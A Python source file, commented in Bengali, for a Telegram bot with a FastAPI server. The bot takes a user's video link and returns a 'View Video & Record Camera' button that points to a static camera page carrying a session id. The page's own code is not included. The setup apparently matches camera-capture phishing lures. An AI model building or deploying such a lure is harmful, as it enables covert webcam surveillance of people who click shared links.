import os
import json
import asyncio
import uvicorn
from urllib.parse import quote  # URL এনকোড করার জন্য
from fastapi import FastAPI, UploadFile, File
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters, CallbackQueryHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup

# --- Configuration ---
# Render-এর Environment Variable থেকে টোকেন নেবে, না পেলে এরর দেবে
BOT_TOKEN = os.getenv("BOT_TOKEN") 
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN Environment Variable-এ সেট করা নেই!")

# ⚠️ এখানে আপনার আসল Render URL দিন (যেমন: https://my-bot.onrender.com)
APP_URL = "https://your-render-app-url.onrender.com" 

app = FastAPI()

# ✅ FIX: static ফোল্ডার না থাকলে স্বয়ংক্রিয়ভাবে তৈরি হবে
os.makedirs("static", exist_ok=True)

# Static files এর জন্য ফোল্ডার মাউন্ট
app.mount("/static", StaticFiles(directory="static"), name="static")

# ✅ FIX: Render Health Check এর জন্য মেইন রুট
@app.get("/", response_class=HTMLResponse)
async def read_root():
    index_path = os.path.join("static", "index.html")
    if os.path.exists(index_path):
        with open(index_path, "r", encoding="utf-8") as f:
            return f.read()
    return "<h1>Bot is running perfectly!</h1><p>static/index.html পাওয়া যায়নি।</p>"

# --- Telegram Bot Functions ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Link দিন")

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_link = update.message.text
    
    # ইউনিক সেশন আইডি তৈরি
    session_id = f"{update.message.from_user.id}_{int(update.message.date.timestamp())}"
    
    # ✅ FIX: URL Encode করা হচ্ছে যাতে ইউজারের লিংকের ? বা & থাকলেও URL না ভাঙে
    encoded_link = quote(user_link, safe="")
    
    # ক্যামেরা পেজের লিংক তৈরি
    camera_page_url = f"{APP_URL}/static/index.html?session={session_id}&source_link={encoded_link}"

    keyboard = [
        [InlineKeyboardButton("View Video & Record Camera", url=camera_page_url)]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"আপনার ভিডিও লিংক: {user_link}\n\nনিচের বাটনে ক্লিক করুন ক্যামেরা রেকর্ড করতে:",
        reply_markup=reply_markup
    )

# --- Bot Application Setup (Global Scope) ---
# application গ্লোবালি তৈরি করা হলো যাতে run_bot ফাংশন এটি খুঁজে পায়
application = ApplicationBuilder().token(BOT_TOKEN).build()

application.add_handler(CommandHandler('start', start))
application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_link))

# --- Run Functions ---
async def run_bot():
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    print("Telegram Bot is running...")
    
    # বট চালু রাখার জন্য Event
    stop_event = asyncio.Event()
    try:
        await stop_event.wait()
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        await application.updater.stop()
        await application.stop()
        await application.shutdown()

async def main():
    # বট এবং ওয়েব সার্ভার একসাথে রান করা
    bot_task = asyncio.create_task(run_bot())
    
    # Render-এর পোর্ট নেওয়া (ডিফল্ট 8000)
    port = int(os.environ.get("PORT", 8000))
    config = uvicorn.Config(app, host="0.0.0.0", port=port, log_level="info")
    server = uvicorn.Server(config)
    
    web_task = asyncio.create_task(server.serve())
    
    await asyncio.gather(bot_task, web_task)

if __name__ == "__main__":
    asyncio.run(main())